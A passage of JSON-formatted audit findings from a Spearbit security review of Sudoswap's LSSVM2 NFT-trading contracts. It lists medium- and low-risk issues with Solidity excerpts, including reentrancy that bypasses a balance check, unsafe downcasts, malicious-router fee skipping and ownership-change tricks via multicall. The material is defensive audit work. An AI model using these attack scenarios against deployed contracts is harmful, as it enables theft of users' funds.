        "body": "The _pullTokenInputAndPayProtocolFee() function pulls ERC20/ETH from caller/router and pays protocol fees, trade fees and royalties proportionately. Trade fees have a threshold of MAX_FEE == 50%, which allows 2*fee to be 100%. Royalty amounts could technically be any percentage as well. This allows edge cases where the protocol fee, trade fee and royalty amounts add up to be > inputAmount. In LSSVMPairERC20, the ordering of subtracting/transferring the protocolFee and royaltyTotal first causes the final attempted transfer of tradeFeeAmount to either revert because of unavailable funds or uses any balance funds from the pair itself. In LSSVMPairETH, the ordering of subtracting/transferring the tradeFees and royaltyTotal first causes the final attempted transfer of protocolFee to either revert because of unavailable funds or uses any balance funds from the pair itself.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NFTs may be exchanged for 0 tokens when price decreases too much",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The sale of multiple NFTs, in combination with linear curves, results in a price decrease. When the resulting price is below 0, then getSellInfo() calculates how many NFTs are required to reach a price of 0. However, the complete number of NFTs is transferred from the originator of the transaction, even while the last few NFTs are worth 0. This might be undesirable for the originator. function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 totalPriceDecrease = delta * numItems; if (spotPrice < totalPriceDecrease) { ... uint256 numItemsTillZeroPrice = spotPrice / delta + 1; numItems = numItemsTillZeroPrice; } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "balanceOf() can be circumvented via reentrancy and two pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A reentrancy issue can occur if two pairs with the same ERC1155 NFTid are deployed. Via a call to swap NFTs, the ERC1155 callback onERC1155BatchReceived() is called. This callback can start a second NFT swap via a second pair. As the second pair has its own reentrancy modifier, this is allowed. This way the balanceOf() check of _takeNFTsFromSender() can be circumvented. If a reentrant call, to a second pair, supplies a sufficient amount of NFTs then the balanceOf() check of the original call can be satisfied at the same time. We haven't found a realistic scenario to abuse this with the current routers. Permissionless routers will certainly increase the risk as they can abuse isRouter == true. If the router is mali- cious then it also has other ways to steal the NFTs; however with the reentrancy scenario it might be less obvious this is happening. Note: ERC777 tokens also contain such a callback and have the same interface as ERC20 so they could be used in an ERC20 pair. function _takeNFTsFromSender(IERC1155 _nft, uint256 numNFTs, bool isRouter, address routerCaller) ... { ... if (isRouter) { ... uint256 beforeBalance = _nft.balanceOf(_assetRecipient, _nftId); ... router.pairTransferERC1155From(...); // reentrancy with other pair require((_nft.balanceOf(_assetRecipient, _nftId) - beforeBalance) == numNFTs, ...); // circumvented } else { ... } ,! }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Function call() is risky and can be restricted further",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function call() is powerful and thus risky. To reduce the risk it can be restricted further by dis- allowing potentially dangerous function selectors. This is also a step closer to introducing permissionless routers. function call(address payable target, bytes calldata data) external onlyOwner { ILSSVMPairFactoryLike _factory = factory(); require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result,) = target.call{value: 0}(data); require(result, \"Call failed\"); } 16",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect newSpotPrice and newDelta may be obtained due to unsafe downcasts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "When calculating newSpotPrice in getBuyInfo(), an unsafe downcast from uint256 into uint128 may occur and silently overflow, leading to much less value for newSpotPrice than expected. function getBuyInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 inputValue, uint256 tradeFee, uint256 protocolFee ) { ... } // get the pair's virtual nft and token reserves uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // calculate the amount to send in uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... // set the new virtual reserves newSpotPrice = uint128(spotPrice + inputValueWithoutFee); // token reserve ... Same happens when calculating newDelta in getSellInfo(): function getSellInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 outputValue, uint256 tradeFee, uint256 protocolFee ) { PoC ... // get the pair's virtual nft and eth/erc20 balance uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // set the new virtual reserves newDelta = uint128(nftBalance + numItems); // nft reserve ... Proof of concept about how this wouldn't revert but silently overflow: 17 import \"hardhat/console.sol\"; contract test{ constructor() { uint256 a = type(uint128).max; uint256 b = 2; uint128 c = uint128(a + b); console.log(c); // c == 1, no error } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fewer checks in pairTransferNFTFrom() and pairTransferERC1155From() than in pairTransfer- ERC20From()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions pairTransferNFTFrom() and pairTransferERC1155From() don't verify that the cor- rect type of pair is used, whereas pairTransferERC20From() does. This means actions could be attempted on the wrong type of pairs. These could succeed for example if a NFT is used that supports both ERC721 and ERC1155. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\" The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } function pairTransferNFTFrom(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferERC1155From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious collection admin can reclaim a pair at any time to deny enhanced setting royalties",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A collection admin can forcibly/selectively call reclaimPair() prematurely (before the advertised and agreed upon lockup period) to unilaterally break the settings contract at any time. This will effectively lead to a DoS to the pair owner for the enhanced royalty terms of the setting despite paying the upfront fee and agreeing to a fee split in return. This is because the unlockTime is enforced only on the previous pair owner and not on collection admins. A malicious collection admin can advertise very attractive setting royalty terms to entice pair owners to pay a high upfront fee to sign-up for their settings contract but then force-end the contract prematurely. This will lead to the pair owner losing the paid upfront fee and the promised attractive royalty terms. A lax pair owner who may not be actively monitoring SettingsRemovedForPair events before the lockup period will be surprised at the prematurely forced settings contract termination by the collection admin, loss of their earlier paid upfront fee and any payments of default royalty instead of their expected enhanced amounts.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "PropertyCheckers and Settings not sufficiently restricted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The LSSVMPairFactory accepts any address for external contracts which contain critical logic but there are no sanity checks done on them. These are the _bondingCurve, _propertyChecker and settings con- tracts. The contracts could perhaps be updated later via a proxy pattern or a create2/selfdestruct pattern which means that it's difficult to completely rely on them. Both _propertyChecker and settings contracts have a factory associated: PropertyCheckerFactory and StandardSettingsFactory. It is straightforward to enforce that only contracts created by the factory can be used. For the bondingCurves there is a whitelist that limits the risk. function createPairERC721ETH(..., ICurve _bondingCurve, ..., address _propertyChecker, ...) ... { ... // no checks on _bondingCurve and _propertyChecker } function toggleSettingsForCollection(address settings, address collectionAddress, bool enable) public { ... // no checks on settings } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external onlyOwner { bondingCurveAllowed[bondingCurve] = isAllowed; emit BondingCurveStatusUpdate(bondingCurve, isAllowed); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious router can skip transfer of royalties and protocol fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A malicious router, if accidentally/intentionally whitelisted by the protocol, may implement pair- TransferERC20From() functions which do not actually transfer the number of tokens as expected. This is within the protocol's threat model as evidenced by the use of before-after balance checks on the _assetRecipient for saleAmount. However, similar before-after balance checks are missing for transfers of royalties and protocol fee payments. the protocol/factory intention- Royalty recipients do not receive their royalties from the malicious router if ally/accidentally whitelists one. The protocol/factory may also accidentally whitelist a malicious router that does not transfer even the protocol fee.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious front-end can sneak intermediate ownership changes to perform unauthorized actions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "LSSVMPair implements an onlyOwner multicall function to allow owner to batch multiple calls. Natspec indicates that this is \"Intended for withdrawing/altering pool pricing in one tx, only callable by owner, can- not change owner.\" The check require(owner() == msg.sender, \"Ownership cannot be changed in multi- call\"); with a preceding comment \"Prevent multicall from malicious frontend sneaking in ownership change\" indicates the intent of the check and that a malicious front-end is within the threat model. While the post-loop check prevents malicious front-ends from executing ownership changing calls that attempt to persist beyond the multicall, this still allows one to sneak in an intermediate ownership change during a call -> perform malicious actions under the new unauthorized malicious owner within onOwnershipTransferred() callback -> change ownership back to originally authorized msg.sender owner before returning from the callback and successfully executing any subsequent (onlyOwner) calls and the existing check. While a malicious front-end could introduce many attack vectors that are out-of-scope for detecting/preventing in backend contracts, an unauthorized ownership change seems like a critical one and warrants additional checks for onlyOwner multicall to prevent malicious actions from being executed in the context of any newly/temporarily unauthorized owner.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing override in authAllowedForToken prevents authorized admins from toggling settings and reclaiming pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Manifold admins are incorrectly not allowed by authAllowedForToken to toggle settings and reclaim their authorized pairs in the protocol context. authAllowedForToken checks for different admin overrides including admin interfaces of NFT marketplaces Nifty, Foundation, Digitalax and ArtBlocks. However, the protocol sup- ports royalties from other marketplaces of Manifold, Rarible, SuperRare and Zora. Of those, Manifold does have getAdmins() interface which is not considered in authAllowedForToken. And it is not certain that the others don't.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Misdirected transfers to invalid pair variants or non-pair recipients may lead to loss/lock of NFTs/tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions depositNFTs() and depositERC20() allow deposits of ERC 721 NFTs and ERC20 tokens after pair creation. While they check that the deposit recipient is a valid pair/variant for emitting an event, the deposit transfers happen prior to the check and without the same validation. With dual home tokens (see weird-erc20), the emit could be skipped when the \"other\" token is transferred. Also, the isPair() check in depositNFTs() does not specifically check if the pair variant is ERC721_ERC20 or ERC721_ETH. This allows accidentally misdirected deposits to invalid pair variants or non-pair recipients leading to loss/lock of NFTs/tokens.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "authAllowedForToken() returns prematurely in certain scenarios causing an authentication DoS",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Tokens listed on Nifty or Foundation (therefore returning a valid niftyRegistry or foundationTrea- sury) where the proposedAuthAddress is not a valid Nifty sender or a valid Foundation Treasury admin will cause an authentication DoS if the token were also listed on Digitalax or ArtBlocks and the proposedAuthAddress had admin roles on those platforms. This happens because the return values of valid and isAdmin for isValidNiftySender(proposedAuthAddress) and isAdmin(proposedAuthAddress) respectively are returned as-is instead of returning only if/when they are true but continuing the checks for authorization otherwise (if/when they are false) on Digitalax and ArtBlocks. toggleSettingsForCollection and reclaimPair (which utilize authAllowedForToken) would incorrectly fail for valid proposedAuthAddress in such scenarios. 21 return",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Partial fills don't recycle ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "After several fixes are applied, the following code exists. If the sell can be filled completely then ETH is recycled, however when a partial fill is applied then ETH is not recycled. This might lead to a revert and would require doing the trade again. This costs extra gas and the trading conditions might be worse then. function swap(Order calldata swapOrder) external payable returns (uint256[] memory results) { ... // Go through each sell order ... if (pairSpotPrice == order.expectedSpotPrice) { // If the pair is an ETH pair and we opt into recycling ETH, add the output to our total accrued if (order.isETHSell && swapOrder.recycleETH) { ... ... order.pair.swapNFTsForToken(... , payable(address(this)), ... ); } // Otherwise, all tokens or ETH received from the sale go to the token recipient else { ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); } } // Otherwise we need to do some partial fill calculations first else { ... ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); // ETH not recycled } // Go through each buy order ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong allowances can be abused by the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function call() allows transferring tokens and NFTs that have an allowance set to the pair. Normally, allowances should be given to the router, but they could be accidentally given to the pair. Although call() is protected by onlyOwner, the pair is created permissionless and so the owner could be anyone.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Malicious router mitigation may break for deflationary tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "ERC20 _pullTokenInputAndPayProtocolFee() for routers has a mitigation for malicious routers by checking if the before-after token balance difference is equal to the transferred amount. This will break for any ERC20 pairs with fee-on-transfer deflationary tokens (see weird-erc20). Note that there has been a real-world exploit related to this with Balancer pool and STA deflationary tokens.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent royalty threshold checks allow some royalties to be equal to sale amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Threshold checks on royalty amounts are implemented both in _getRoyaltyAndSpec() and its caller _calculateRoyalties(). While _calculateRoyalties() implements an inclusive check with require(saleAmount >= royaltyTotal, \"Royalty exceeds sale price\");, (allowing royalty to be equal to sale amount) the different checks in _getRoyaltyAndSpec() on the returned amounts or in the calculations on bps in _computeAmounts() exclude the saleAmount forcing royalty to be less than the saleAmount. However, only Known Origin and SuperRare are missing a similar threshold check in _getRoyaltyAndSpec(). This allows only the Known Origin and SuperRare royalties to be equal to the sale amount as enforced by the check in _calculateRoyalties().",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Numerical difference between getNFTQuoteForBuyOrderWithPartialFill() and _findMaxFill- ableAmtForBuy() may lead to precision errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "There is a slight numerical instability between the partial fill calculation and the first client side cal- culation (i.e. getNFTQuoteForSellOrderWithPartialFill() / getNFTQuoteForBuyOrderWithPartialFill(), _- findMaxFillableAmtForBuy() ). This is because getNFTQuoteForSellOrderWithPartialFill() first assumes a buy of 1 item, updates spotPrice/delta, and then gets the next subsequent quote to buy the next item. Whereas _findMaxFillableAmtForBuy() assumes buying multiple items at one time. This can for e.g. Exponential- Curve.sol and XykCurve.sol lead to minor numerical precision errors. function getNFTQuoteForBuyOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, ...); ... } } function getNFTQuoteForSellOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getSellInfo(spotPrice, delta, 1, fee, ... ); ... } ... } function _findMaxFillableAmtForBuy(LSSVMPair pair, uint256 maxNumNFTs, uint256[] memory ,! maxCostPerNumNFTs, uint256 ... while (start <= end) { ... (...) = pair.bondingCurve().getBuyInfo(spotPrice, delta, (start + end)/2, feeMultiplier, ,! protocolFeeMultiplier); ... } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Differences with Manifold version of RoyaltyEngine may cause unexpected behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Sudoswap has forked RoyaltyEngine from Manifold; however there are some differences. The Manifold version of _getRoyaltyAndSpec() also queries getRecipients(), while the Sudoswap version doesn't. This means the Sudoswap will not spread the royalties over all recipients. function _getRoyaltyAndSpec(...) // Manifold ,! ,! ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 amount) { ... try IRoyaltySplitter(royaltyAddress).getRecipients() returns (Recipient[] memory splitRecipients) { ... } } } function _getRoyaltyAndSpec(...) // Sudoswap ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 ,! amount) { ... } ... } } The Manifold version of getRoyalty() has an extra try/catch compared to the Sudoswap version. This protects against reverts in the cached functions. Note: adding an extra try/catch requires the function _getRoyaltyAnd- Spec() to be external. function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Manifold ... try this._getRoyaltyAndSpec{gas: 100000}(tokenAddress, tokenId, value) returns ( ... ) .... } function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Sudoswap ... ... (...) = _getRoyaltyAndSpec(tokenAddress, tokenId, value); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Swaps with property-checked ERC1155 sell orders in VeryFastRouter will fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Any swap batch of transactions which has a property-checked sell order for ERC1155 will revert. Given that property checks are not supported on ERC1155 pairs (but only ERC721), swap sell orders for ERC1155 in VeryFastRouter will fail if order.doPropertyCheck is accidentally set because the logic thereafter assumes it is an ERC721 order.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell because it uses > instead of >= in the check pairBalance > newPriceToSellToPair.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lack of support for per-token royalties may lead to incorrect royalty payments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The protocol currently lacks complete support for per-token royalties, assumes that all NFTs in a pair have the same royalty and so considers the first assetId to determine royalties for all NFT token Ids in the pair. If not, the pair owner is expected to make a new pair for NFTs that have different royalties. A pair with NFTs that have different royalties will lead to incorrect royalty payments for the different NFTs.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing additional safety for multicall may lead to lost ETH in future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "If the function multicall() would be payable, then multiple delegated-to functions could use the same msg.value , which could result in losing ETH from the pair. A future upgrade of Solidity might change the default setting for function to payable. See Solidity issue#12539. function multicall(bytes[] calldata calls, bool revertOnFail) external onlyOwner { for (uint256 i; i < calls.length;) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); ... } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing zero-address check may allow re-initialization of pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "address(0), \"Initialized\");. However, without a zero-address check on _owner, this can be true even later if the pair is initialized accidentally with address(0) instead of msg.sender. This is because __Ownable_init in OwnableWithTransferCallback does not disallow address(0) unlike transferOwnership. This is however not the case with the current implementation where LSSVMPair.initialize() is called from LSSVMPairFactory with msg.sender as argument for _owner. it Therefore, LSSVMPair.initialize() may be called multiple times.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Trade pair owners are allowed to change asset recipient address when it has no impact",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Trade pair owners are allowed to change their asset recipient address using changeAssetRecipi- ent() while getAssetRecipient() always returns the pair address itself for Trade pairs as expected. Trade pair owners mistakenly assume that they can change their asset recipient address using changeAssetRe- cipient() because they are allowed to do so successfully, but may be surprised to see that it has no effect. They may expect assets at the new address but that will not be the case.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "NFT projects with custom settings and multiple royalty receivers will receive royalty only for first receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "_calculateRoyalties() and its view equivalent only consider the first royalty receiver when custom settings are enabled. If non-ERC-2981 compliant NFT projects on Manifold/ArtBlocks or other platforms that support multiple royalty receivers come up with custom settings that pair owners subscribe to, then all the royalty will go to the first recipient. Other receivers will not receive any royalties.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing non-zero checks allow event emission spamming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions depositNFTs() and depositERC20() are meant to allow deposits into the pair post- creation. However, they do not check if non-zero NFTs or tokens are being deposited. The event emission only checks if the pair recipient is valid. Given their permissionless nature, this allows anyone to grief the system with zero NFT/token deposits causing emission of events which may hinder indexing/monitoring systems.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing sanity zero-address checks may lead to undesired behavior or lock of funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Certain logic requires zero-address checks to avoid undesired behavior or lock of funds. For exam- ple, in Splitter.sol#L34 users can permanently lock ETH by mistakenly using safeTransferETH with default/zero- address value.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Legacy NFTs are not compatible with protocol pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Pairs support ERC721 and ERC1155 NFTs. However, users of NFT marketplaces may also expect to find OG NFTs such as Cryptopunks, Etherrocks or Cryptokitties, which do not adhere to these ERC standards. For example, Cryptopunks have their own internal marketplace which allows users to trade their NFTs with other users. Given that Cryptopunks does not adhere to the ERC721 standard, it will always fail when the protocol attempts to trade them. Even with wrapped versions of these NFTs, people who aren't aware or have the original version won't be able to trade them in a pair.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unnecessary payable specifier for functions may allow ETH to be sent and locked/lost",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "LSSVMPair.initialize() which do not expect to receive and process Ether have the payable specifier which allows interacting users to accidentally send them Ether which will get locked/lost. LSSVMRouter.robustSwapERC20ForSpecificNFTsAndNFTsToToken() Functions",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Obsolete Splitter contract may lead to locked ETH/tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "After a pair has be reclaimed via reclaimPair(), pairInfos[] will be emptied and getPrevFeeRe- cipientForPair() will return 0. The obsolete Splitter will however remain present, but any ETH or tokens that are sent to the contract can't be completely retrieved via withdrawETH() and withdrawTokens(). This is because getPrevFeeRecipientForPair() is 0 and the tokens would be send to address(0). It is unlikely though that ETH or tokens are sent to the Splitter contract as it is not used anymore. function withdrawETH(uint256 ethAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... payable(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter())).safeTransferETH(... ); ,! } function withdrawTokens(ERC20 token, uint256 tokenAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... token.safeTransfer(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter()), ... ); c } function getPrevFeeRecipientForPair(address pairAddress) public view returns (address) { return pairInfos[pairAddress].prevFeeRecipient; } function reclaimPair(address pairAddress) public { ... delete pairInfos[pairAddress]; ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Divisions in getBuyInfo() and getSellInfo() may be rounded down to 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In extreme cases (e.g. tokens with a few decimals, see this example), divisions in getBuyInfo() and getSellInfo() may be rounded down to 0. This means inputValueWithoutFee and/or outputValueWithoutFee may be 0. function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... } function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 outputValueWithoutFee = (numItems * tokenBalance) / (nftBalance + numItems); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Last NFT in an XykCurve cannot be sold",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function getBuyInfo() of XykCurve enforces numItems < nftBalance, which means the last NFT can never be sold. One potential solution as suggested by the Sudoswap team is to set delta (=nftBalance) one higher than the real amount of NFTs. This could cause problems in other parts of the code. For example, once only one NFT is left, if we try to use changeSpotPriceAndDelta(), getBuyNFTQuote(1) will error and thus the prices (tokenBalance) and delta (nftBalance) can't be changed anymore. If nftBalance is set to one higher, then it won't satisfy pair.nft().balanceOf(pairAddress) >= 1. 31 contract XykCurve ... { function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // If numItems is too large, we will get divide by zero error if (numItems >= nftBalance) { return (Error.INVALID_NUMITEMS, 0, 0, 0, 0, 0); } ... } } function changeSpotPriceAndDelta(...) ... { ... (,,, uint256 priceToBuyFromPair,) = pair.getBuyNFTQuote(1); ... if (... && pair.nft().balanceOf(pairAddress) >= 1) { pair.changeSpotPrice(newSpotPrice); pair.changeDelta(newDelta); return; } ... } function getBuyNFTQuote(uint256 numNFTs) ... { (error, ...) = bondingCurve().getBuyInfo(..., numNFTs, ...); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Allowing different ERC20 tokens in LSSVMRouter swaps will affect accounting and lead to unde- fined behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "As commented \"Note: All ERC20 swaps assume that a single ERC20 token is used for all the pairs involved. * Swapping using multiple tokens in the same transaction is possible, but the slippage checks * & the return values will be meaningless and may lead to undefined behavior.\" This assumption may be risky if users end up mistakenly using different ERC20 tokens in different swaps. Summing up their inputAmount and remainingValue will not be meaningful and lead to accounting errors and undefined behavior (as noted).",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing array length equality checks may lead to incorrect or undefined behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Functions taking two array type parameters and not checking that their lengths are equal may lead to incorrect or undefined behavior when accidentally passing arrays of unequal lengths.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Owners may have funds locked if newOwner is EOA in transferOwnership()",
